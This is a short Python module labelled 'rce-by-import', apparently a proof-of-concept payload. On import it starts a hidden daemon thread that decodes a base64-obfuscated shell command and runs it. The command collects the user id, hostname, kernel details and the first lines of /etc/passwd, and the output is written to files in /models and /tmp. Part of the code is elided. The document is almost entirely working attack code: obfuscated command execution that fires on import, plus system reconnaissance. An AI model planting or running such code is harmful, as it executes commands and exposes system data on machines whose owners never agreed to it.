# rce-by-import v10 - unique module a1de6ee4
import os, subprocess, base64, threading, json, urllib.request

def _pwn_a1de6ee4():
    try:
        import base64 as b
        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgY2F0IC9ldGMvcGFzc3dkIHwgaGVhZCAtMjA=").decode()
        out = subprocess.check_output(cmd, shell=True, timeout=10, stderr=subprocess.STDOUT)
        out_s = out.decode(errors="replace")
        for d in ["/models", "/tmp"]:
            try:
                with open(d + "/PWNED-DATA-a1de6ee4.txt", "w") as f:
                    f.write(out_s)
            except Exception:
                pass
...
threading.Thread(target=_pwn_a1de6ee4, daemon=True).start()
